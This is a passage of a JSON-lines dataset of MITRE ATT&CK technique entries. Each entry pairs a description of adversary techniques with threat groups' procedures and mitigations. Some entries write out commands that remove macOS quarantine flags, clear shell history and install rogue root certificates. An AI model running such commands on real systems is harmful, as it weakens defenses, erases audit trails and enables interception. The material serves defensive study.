/path/to/examplefile</code>. Similarly, this attribute can be recursively removed from all files in a folder using xattr, <code>sudo xattr -d com.apple.quarantine /path/to/folder</code>.(Citation: 20 macOS Common Tools and Techniques)(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation: theevilbit gatekeeper bypass 2021) Apps and files", "idx": "https://attack.mitre.org/techniques/T1553/001", "title": "Gatekeeper Bypass", "entity": "Gatekeeper Bypass", "entity_type": "techniques", "entity_context": ["CoinTicker downloads the EggShell mach-o binary using curl, which does not set the quarantine flag.", "System settings can prevent applications from running that haven't been downloaded through the Apple Store which can help mitigate some of these issues. ", "OSX_OCEANLOTUS.D uses the command <code>xattr -d com.apple.quarantine</code> to remove the quarantine file attribute used by Gatekeeper and Notarization checks.", "If running with elevated privileges, OSX/Shlayer uses the <code>spctl</code> command to disable Gatekeeper protection for a downloaded file. OSX/Shlayer also leveraged system links pointing to bash scripts in the downloaded DMG file to bypass Gatekeeper, a flaw patched in macOS 11.3 and later versions."], "is_subtechnique": true}
{"text": " An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks. These services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment. Remote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land) Remote access tools may be established and used post-compromise as alternate communications channel for redundant access or as a way to establish an interactive remote desktop session with the target system. They may also be used as a component of malware to establish a reverse connection or back-connect to a service or adversary controlled system. Admin tools such as TeamViewer have been used by several groups targeting institutions in countries of interest to the Russian state and criminal campaigns. (Citation: CrowdStrike 2015 Global Threat Report) (Citation: CrySyS Blog TeamSpy)", "idx": "https://attack.mitre.org/techniques/T1219", "title": "Remote Access Software", "entity": "Remote Access Software", "entity_type": "techniques", "entity_context": ["Dridex contains a module for VNC.", "EVILNUM has used the malware variant, TerraTV, to run a legitimate TeamViewer application to connect to compromrised machines.", "GOLD SOUTHFIELD has used the cloud-based remote management and monitoring tool \"ConnectWise Control\" to deploy REvil.", "Thrip used a cloud-based remote access software called LogMeIn for their attacks.", "Mustang Panda has installed TeamViewer on targeted systems.", "MuddyWater has used a legitimate application, ScreenConnect, to manage systems remotely and move laterally. ", "RTM has the capability to download a VNC module from command and control (C2).", "Kimsuky has used a modified TeamViewer client as a command and control channel.", "Network intrusion detection and prevention systems that use network signatures may be able to prevent traffic to remote access services.", "Properly configure firewalls, application firewalls, and proxies to limit outgoing traffic to sites and services used by remote access tools.", "Use application control to mitigate installation and use of unapproved software that can be used for remote access.", "Carbanak used legitimate programs such as AmmyyAdmin and Team Viewer for remote interactive C2 to target systems.", "TrickBot uses vncDll module to remote control the victim machine.", "Sandworm Team has used remote administration tools or remote industrial control system client software to maliciously release electricity breakers.", "Night Dragon has used several remote administration tools as persistent infiltration channels.", "Carbanak has a plugin for VNC and Ammyy Admin Tool.", "DarkVishnya used DameWare Mini Remote Control for lateral movement.", "Cobalt Group used the Ammyy Admin tool as well as TeamViewer for remote access, including to preserve remote access if a Cobalt Strike module was lost.", "Hildegard has established tmate sessions for C2 communications.", "Egregor has checked for the LogMein event log in an attempt to encrypt files in remote machines.", "TeamTNT has established tmate sessions for C2 communications.", "RTM has used a modified version of TeamViewer and Remote Utilities for remote access."], "is_subtechnique": false}
{"text": " **This technique has been deprecated. Please use [Create Account](https://attack.mitre.org/techniques/T1136), [Web Shell](https://attack.mitre.org/techniques/T1505/003), and [External Remote Services](https://attack.mitre.org/techniques/T1133) where appropriate.** Adversaries may use more than one remote access tool with varying command and control protocols or credentialed access to remote services so they can maintain access if an access mechanism is detected or mitigated. If one type of tool is detected and blocked or removed as a response but the organization did not gain a full understanding of the adversary's tools and access, then the adversary will be able to retain access to the network. Adversaries may also attempt to gain access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use [External Remote Services](https://attack.mitre.org/techniques/T1133) such as external VPNs as a way to maintain access despite interruptions to remote access tools deployed within a target network.(Citation: Mandiant APT1) Adversaries may also retain access through cloud-based infrastructure and applications. Use of a [Web Shell](https://attack.mitre.org/techniques/T1100) is one such way to maintain access to a network through an externally accessible Web server.", "idx": "https://attack.mitre.org/techniques/T1108", "title": "Redundant Access", "entity": "Redundant Access", "entity_type": "techniques", "entity_context": ["Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and will be different across various malware families and versions. Adversaries will likely change tool signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. "], "is_subtechnique": false}
{"text": " Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.(Citation: Cyware Social Media)(Citation: SecurityTrails Google Hacking)(Citation: ExploitDB GoogleHacking) Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Phishing](https://attack.mitre.org/techniques/T1566)).", "idx": "https://attack.mitre.org/techniques/T1593", "title": "Search Open Websites/Domains", "entity": "Search Open Websites/Domains", "entity_type": "techniques", "entity_context": ["Sandworm Team researched Ukraine's unique legal entity identifier (called an \"EDRPOU\" number), including running queries on the EDRPOU website, in preparation for the NotPetya attack. Sandworm Team has also researched third-party websites to help it craft credible spearphishing emails.", "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."], "is_subtechnique": false}
{"text": " In addition to clearing system logs, an adversary may clear the command history of a compromised account to conceal the actions undertaken during an intrusion. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done. On Linux and macOS, these command histories can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable <code>HISTFILE</code>. When a user logs off a system, this information is flushed to a file in the user's home directory called <code>~/.bash_history</code>. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Adversaries may delete their commands from these logs by manually clearing the history (<code>history -c</code>) or deleting the bash history file <code>rm ~/.bash_history</code>. On Windows hosts, PowerShell has two different command history providers: the built-in history and the command history managed by the <code>PSReadLine</code> module. The built-in history only tracks the commands used in the current session. This command history is not available to other sessions and is deleted when the session ends. The <code>PSReadLine</code> command history tracks the commands used in all PowerShell sessions and writes them to a file (<code>$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt</code> by default). This history file is available to all sessions and contains all past history since the file is not deleted when the session ends.(Citation: Microsoft PowerShell Command History) Adversaries may run the PowerShell command <code>Clear-History</code> to flush the entire command history", "idx": "https://attack.mitre.org/techniques/T1070/003", "title": "Clear Command History", "entity": "Clear Command History", "entity_type": "techniques", "entity_context": ["Hildegard has used history -c to clear script shell logs.", "Making the environment variables associated with command history read only may ensure that the history is preserved.", "menuPass has used Wevtutil to remove PowerShell execution logs.", "Kobalos can remove all command history on compromised hosts.\t", "TeamTNT has cleared command history with <code>history -c</code>.", "APT41 attempted to remove evidence of some of its activity by deleting Bash histories.", "Preventing users from deleting or writing to certain files can stop adversaries from maliciously altering their <code>~/.bash_history</code> files.", "Preventing users from deleting or writing to certain files can stop adversaries from maliciously altering their <code>~/.bash_history</code> or <code>ConsoleHost_history.txt</code> files."], "is_subtechnique": true}
{"text": " Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. InstallUtil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. (Citation: MSDN InstallUtil) InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system: <code>C:\\Windows\\Microsoft.NET\\Framework\\v<version>\\InstallUtil.exe</code> and <code>C:\\Windows\\Microsoft.NET\\Framework64\\v<version>\\InstallUtil.exe</code>. InstallUtil may also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil)", "idx": "https://attack.mitre.org/techniques/T1218/004", "title": "InstallUtil", "entity": "InstallUtil", "entity_type": "techniques", "entity_context": ["menuPass has used <code>InstallUtil.exe</code> to execute malicious software.", "Use application control configured to block execution of InstallUtil.exe if it is not required for a given system or network to prevent potential misuse by adversaries.", "InstallUtil may not be necessary within a given environment.", "Mustang Panda has used <code>InstallUtil.exe</code> to execute a malicious Beacon stager.", "Chaes has used Installutill to download content."], "is_subtechnique": true}
{"text": " Adversaries can use stolen session cookies to authenticate to web applications and services. This technique bypasses some multi-factor authentication protocols since the session is already authenticated.(Citation: Pass The Cookie) Authentication cookies are commonly used in web applications, including cloud-based services, after a user has authenticated to the service so credentials are not passed and re-authentication does not need to occur as frequently. Cookies are often valid for an extended period of time, even if the web application is not actively used. After the cookie is obtained through [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) or [Web Cookies](https://attack.mitre.org/techniques/T1606/001), the adversary may then import the cookie into a browser they control and is then able to use the site or application as the user for as long as the session cookie is active. Once logged into the site, an adversary can access sensitive information, read email, or perform actions that the victim account has permissions to perform. There have been examples of malware targeting session cookies to bypass multi-factor authentication systems.(Citation: Unit 42 Mac Crypto Cookies January 2019)", "idx": "https://attack.mitre.org/techniques/T1550/004", "title": "Web Session Cookie", "entity": "Web Session Cookie", "entity_type": "techniques", "entity_context": ["APT29 used a forged <code>duo-sid</code> cookie to bypass MFA set on an email account.", "Configure browsers or tasks to regularly delete persistent cookies."], "is_subtechnique": true}
{"text": " Adversaries may abuse system services or daemons to execute commands or programs. Adversaries can execute malicious content by interacting with or creating services either locally or remotely. Many services are set to run at boot, which can aid in achieving persistence ([Create or Modify System Process](https://attack.mitre.org/techniques/T1543)), but adversaries can also abuse services for one-time or temporary execution.", "idx": "https://attack.mitre.org/techniques/T1569", "title": "System Services", "entity": "System Services", "entity_type": "techniques", "entity_context": ["On Windows 10, enable Attack Surface Reduction (ASR) rules to block processes created by PsExec from running. ", "Ensure that permissions disallow services that run at a higher permissions level from being created or interacted with by a user with a lower permission level.", "Ensure that high permission level service binaries cannot be replaced or modified by users with a lower permission level.", "Prevent users from installing their own launch agents or launch daemons."], "is_subtechnique": false}
{"text": " Adversaries may target the operating system (OS) for a DoS attack, since the (OS) is responsible for managing the finite resources on a system. These attacks do not need to exhaust the actual resources on a system since they can simply exhaust the limits that an OS self-imposes to prevent the entire system from being overwhelmed by excessive demands on its capacity. Different ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood) ACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources", "idx": "https://attack.mitre.org/techniques/T1499/001", "title": "OS Exhaustion Flood", "entity": "OS Exhaustion Flood", "entity_type": "techniques", "entity_context": ["Leverage services provided by Content Delivery Networks (CDN) or providers specializing in DoS mitigations to filter traffic upstream from services. Filter boundary traffic by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. To defend against SYN floods, enable SYN Cookies."], "is_subtechnique": true}
{"text": " Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM) Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor) Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)", "idx": "https://attack.mitre.org/techniques/T1556/003", "title": "Pluggable Authentication Modules", "entity": "Pluggable Authentication Modules", "entity_type": "techniques", "entity_context": ["Limit access to the root account and prevent users from modifying PAM components through proper privilege separation (ex SELinux, grsecurity, AppArmor, etc.) and limiting Privilege Escalation opportunities.", "Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users.", "Integrating multi-factor authentication (MFA) as part of organizational policy can greatly reduce the risk of an adversary gaining control of valid credentials that may be used for additional tactics such as initial access, lateral movement, and collecting information.", "Ebury can deactivate PAM modules to tamper with the sshd configuration."], "is_subtechnique": true}
{"text": " Adversaries may create an account to maintain access to victim systems. With a sufficient level of access, creating such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system. Accounts may be created on the local system or within a domain or cloud tenant. In cloud environments, adversaries may create accounts that only have access to specific services, which can reduce the chance of detection.", "idx": "https://attack.mitre.org/techniques/T1136", "title": "Create Account", "entity": "Create Account", "entity_type": "techniques", "entity_context": ["Sandworm Team added a login to a SQL Server with <code>sp_addlinkedsrvlogin</code>.", "Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts.", "Protect domain controllers by ensuring proper security configuration for critical servers.", "Use multi-factor authentication for user and privileged accounts.", "Do not allow domain administrator accounts to be used for day-to-day operations that may expose them to potential adversaries on unprivileged systems.", "Indrik Spider used <code>wmic.exe</code> to add a new user to the system."], "is_subtechnique": false}
{"text": " Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate.(Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website. Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials.(Citation: Operation Emmental) Atypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) capability for intercepting information transmitted over secure TLS/SSL communications.(Citation: Kaspersky Superfish) Root certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign", "idx": "https://attack.mitre.org/techniques/T1553/004", "title": "Install Root Certificate", "entity": "Install Root Certificate", "entity_type": "techniques", "entity_context": ["RTM can add a certificate to the Windows store.", "Dok installs a root certificate to aid in Adversary-in-the-Middle actions using the command <code>add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /tmp/filename</code>.", "Hikit uses <code>certmgr.exe -add GlobalSign.cer -c -s -r localMachine Root</code> and <code>certmgr.exe -add GlobalSign.cer -c -s -r localMachineTrustedPublisher</code> to install a self-generated certificate to the local trust store as a root CA and Trusted Publisher.", "HTTP Public Key Pinning (HPKP) is one method to mitigate potential Adversary-in-the-Middle situations where and adversary uses a mis-issued or fraudulent certificate to intercept encrypted communications by enforcing use of an expected certificate. ", "certutil can be used to install browser root certificates as a precursor to performing Adversary-in-the-Middle between connections to banking websites. Example command: <code>certutil -addstore -f -user ROOT ProgramData\\cert512121.der</code>.", "Windows Group Policy can be used to manage root certificates and the <code>Flags</code> value of <code>HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\SystemCertificates\\\\Root\\\\ProtectedRoots</code> can be set to 1 to prevent non-administrator users from making further root installations into their own HKCU certificate store. "], "is_subtechnique": true}
{"text": " Adversaries may stage data collected from multiple systems in a central location or directory on one system prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location. In cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020) By staging data on one system prior to Exfiltration, adversaries can minimize the number of connections made to their C2 server and better evade detection.", "idx": "https://attack.mitre.org/techniques/T1074/002", "title": "Remote Data Staging", "entity": "Remote Data Staging", "entity_type": "techniques", "entity_context": ["APT28 has staged archives of collected data on a target's Outlook Web Access (OWA) server.", "Night Dragon has copied files to company web servers and subsequently downloaded them.", "FIN8 aggregates staged data from a network into a single location.", "Threat Group-3390 has moved staged encrypted archives to Internet-facing servers that had previously been compromised with China Chopper prior to exfiltration.", "Leviathan has staged data remotely prior to exfiltration.", "FIN6 actors have compressed data from remote systems and moved it to another staging system before exfiltration.", "Chimera has staged stolen data on designated servers in the target environment.", "APT29 staged data and files in password-protected archives on a victim's OWA server.", "menuPass has staged data on remote MSP systems or other victim networks prior to exfiltration."], "is_subtechnique": true}
{"text": " Adversaries may sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary. Network sniffing may also reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent Lateral Movement and/or Defense Evasion activities.", "idx": "https://attack.mitre.org/techniques/T1040", "title": "Network Sniffing", "entity": "Network Sniffing", "entity_type": "techniques", "entity_context": ["APT33 has used SniffPass to collect credentials by sniffing network traffic.", "Emotet has been observed to hook network APIs to monitor network traffic. ", "Penquin can sniff network traffic to look for packets matching specific conditions.", "PoshC2 contains a module for taking packet captures on compromised hosts.", "NBTscan can dump and print whole packet content.\t", "Use multi-factor authentication wherever possible.", "MESSAGETAP uses the libpcap library to listen to all traffic and parses network protocols starting with Ethernet and IP layers. It continues parsing protocol layers including SCTP, SCCP, and TCAP and finally extracts SMS message data and routing metadata.  ", "Sandworm Team has used intercepter-NG to sniff passwords in network traffic.\t", "DarkVishnya used network sniffing to obtain login data. ", "Ensure that all wired and/or wireless traffic is encrypted appropriately. Use best practices for authentication protocols, such as Kerberos, and ensure web traffic that may contain credentials is protected by SSL/TLS.", "Responder captures hashes and credentials that are sent to the system after the name services have been poisoned.", "APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials. APT28 close-access teams have used Wi-Fi pineapples to intercept Wi-Fi signals and user credentials.", "Impacket can be used to sniff network traffic via an interface or raw socket.", "Kimsuky has used the Nirsoft SniffPass network sniffer to obtain passwords sent over non-secure protocols.", "Empire can be used to conduct packet captures on target hosts.", "Regin appears to have functionality to sniff for credentials passed over HTTP, SMTP, and SMB."], "is_subtechnique": false}
{"text": " Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014) Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)", "idx": "https://attack.mitre.org/techniques/T1564/004", "title": "NTFS File Attributes", "entity": "NTFS File Attributes", "entity_type": "techniques", "entity_context": ["Gazer stores configuration items in alternate data streams (ADSs) if the Registry is not accessible.", "Astaroth can abuse alternate data streams (ADS) to store content for malicious payloads.", "PowerDuke hides many of its backdoor payloads in an alternate data stream (ADS).", "LoJax has loaded an embedded NTFS DXE driver to be able to access and write to NTFS partitions.", "Some variants of the Zeroaccess Trojan have been known to store data in Extended Attributes.", "Consider adjusting read and write permissions for NTFS EA, though this should be tested to ensure routine OS operations are not impeded. ", "If the victim is using PowerShell 3.0 or later, POWERSOURCE writes its decoded payload to an alternate data stream (ADS) named kernel32.dll that is saved in <code>%PROGRAMDATA%\\Windows\\</code>.", "Valak has the ability save and execute files as alternate data streams (ADS).", "BitPaymer has copied itself to the <code>:bin</code> alternate data stream of a newly created file.", "esentutl can be used to read and write alternate data streams.", "Anchor has used NTFS to hide files.", "WastedLocker has the ability to save and execute files as an alternate data stream (ADS).", "APT32 used NTFS alternate data streams to hide their payloads.", "Expand can be used to download or copy a file into an alternate data stream.", "The Regin malware platform uses Extended Attributes to store encrypted executables."], "is_subtechnique": true}
{"text": " Adversaries may abuse Microsoft Outlook's Home Page feature to obtain persistence on a compromised system. Outlook Home Page is a legacy feature used to customize the presentation of Outlook folders. This feature allows for an internal or external URL to be loaded and presented whenever a folder is opened. A malicious HTML page can be crafted that will execute code when loaded by Outlook Home Page.(Citation: SensePost Outlook Home Page) Once malicious home pages have been added to the user’s mailbox, they will be loaded when Outlook is started. Malicious Home Pages will execute when the right Outlook folder is loaded/reloaded.(Citation: SensePost Outlook Home Page)", "idx": "https://attack.mitre.org/techniques/T1137/004", "title": "Outlook Home Page", "entity": "Outlook Home Page", "entity_type": "techniques", "entity_context": ["On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Office applications from creating child processes and from writing potentially malicious executable content to disk. ", "Ruler can be used to automate the abuse of Outlook Home Pages to establish persistence. ", "OilRig has abused the Outlook Home Page feature for persistence. OilRig has also used CVE-2017-11774 to roll back the initial patch designed to protect against Home Page abuse.", "For the Outlook methods, blocking macros may be ineffective as the Visual Basic engine used for these features is separate from the macro scripting engine. Microsoft has released patches to try to address each issue. Ensure KB3191938 which blocks Outlook Visual Basic and displays a malicious code warning, KB4011091 which disables custom forms by default, and KB4011162 which removes the legacy Home Page feature, are applied to systems."], "is_subtechnique": true}
{"text": " Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.(Citation: MSDN MSBuild) Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.(Citation: MSDN MSBuild)(Citation: Microsoft MSBuild Inline Tasks 2017) MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.(Citation: LOLBAS Msbuild)", "idx": "https://attack.mitre.org/techniques/T1127/001", "title": "MSBuild", "entity": "MSBuild", "entity_type": "techniques", "entity_context": ["Empire can use built-in modules to abuse trusted utilities like MSBuild.exe.\n", "Frankenstein has used MSbuild to execute an actor-created file.", "Use application control configured to block execution of <code>msbuild.exe</code> if it is not required for a given system or network to prevent potential misuse by adversaries. For example, in Windows 10 and Windows Server 2016 and above, Windows Defender Application Control (WDAC) policy rules may be applied to block the <code>msbuild.exe</code> application and to prevent abuse.", "MSBuild.exe may not be necessary within an environment and should be removed if not being used.", "A version of PlugX loads as shellcode within a .NET Framework project using msbuild.exe, presumably to bypass application control techniques."], "is_subtechnique": true}
{"text": " Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans using tools that are brought onto a system. Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.", "idx": "https://attack.mitre.org/techniques/T1046", "title": "Network Service Scanning", "entity": "Network Service Scanning", "entity_type": "techniques", "entity_context": ["XTunnel is capable of probing the network for open ports.", "HDoor scans to identify open ports on the victim.", "ZxShell can launch port scans. ", "Remsec has a plugin that can perform ARP scanning as well as port scanning.", "Conficker scans for other machines to infect.", "Operation Wocao has scanned for open ports and used nbtscan to find NETBIOS nameservers.", "Hildegard has used masscan to look for kubelets in the internal Kubernetes network.", "Empire can perform port scans from an infected host.", "Naikon has used the LadonGo scanner to scan target networks.", "Xbash can perform port scanning of TCP and UDP ports.", "Rocke conducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.", "Ramsay can scan for systems that are vulnerable to the EternalBlue exploit.\t", "FIN6 used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.", "Cobalt Group leveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.", "Leafminer scanned network services to search for vulnerabilities in the victim system.", "PoshC2 can perform port scans from an infected host.", "Industroyer uses a custom port scanner to map out a network.", "SpeakUp checks for availability of specific ports on servers.", "CostaRicto employed nmap and pscan to scan target environments.", "Pupy has a built-in module for port scanning.", "Cobalt Strike can perform port scans from an infected host.", "Chimera has used the <code>get -b <start ip> -e <end ip> -p</code> command for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.", "BackdoorDiplomacy has used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.", "InvisiMole can scan the network for open ports and vulnerable instances of RDP and SMB protocols.", "Koadic can scan for open TCP ports on the target network.", "Tropic Trooper used <code>pr</code> and an openly available tool to scan for open ports on target systems.", "P.A.S. Webshell can scan networks for open ports and listening services.", "China Chopper's server component can spider authentication portals.", "Suckfly the victim's internal network for hosts with ports 8080, 5900, and 40 open.", "Ensure that unnecessary ports and services are closed to prevent risk of discovery and potential exploitation.", "Ensure proper network segmentation is followed to protect critical servers and devices.", "Fox Kitten has used tools including NMAP to conduct broad scanning to identify open ports.", "MURKYTOP has the capability to scan for open ports on hosts in a connected network.", "APT41 used a malware variant called WIDETONE to conduct port scans on specified subnets.", "NBTscan can be used to scan IP networks.", "TeamTNT has used masscan to search for open Docker API ports. TeamTNT has also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.", "APT39 has used CrackMapExec and a custom port scanner known as BLUETORCH for network scanning.", "OilRig has used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.", "Caterpillar WebShell has a module to use a port scanner on a system. ", "menuPass has used tcping.exe, similar to Ping, to probe port status on systems of interest.", "APT32 performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.", "Lucifer can scan for open ports including TCP ports 135 and 1433.", "Pysa can perform network reconnaissance using the Advanced Port Scanner tool.", "BlackEnergy has conducted port scans on a host.", "Use network intrusion detection/prevention systems to detect and prevent remote service scans.", "Threat Group-3390 actors use the Hunter tool to conduct network service discovery for vulnerable systems.", "DarkVishnya performed port scanning to obtain the list of active services."], "is_subtechnique": false}
{"text": " Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance. Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.(Citation: SingHealth Breach Jan 2019) Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.(Citation: Sophos Ragnar May 2020)", "idx": "https://attack.mitre.org/techniques/T1564/006", "title": "Run Virtual Instance", "entity": "Run Virtual Instance", "entity_type": "techniques", "entity_context": ["LoudMiner has used QEMU and VirtualBox to run a Tiny Core Linux virtual machine, which runs XMRig and makes connections to the C2 server for updates.", "Maze operators have used VirtualBox and a Windows 7 virtual machine to run the ransomware; the virtual machine's configuration file mapped the shared network drives of the target company, presumably so Maze can encrypt files on the shared drives as well as the local machine. ", "Use application control to mitigate installation and use of unapproved virtualization software.", "Disable Hyper-V if not necessary within a given environment.", "Ragnar Locker has used VirtualBox and a stripped Windows XP virtual machine to run itself. The use of a shared folder specified in the configuration enables Ragnar Locker to encrypt files on the host operating system, including files on any mapped drives."], "is_subtechnique": true}
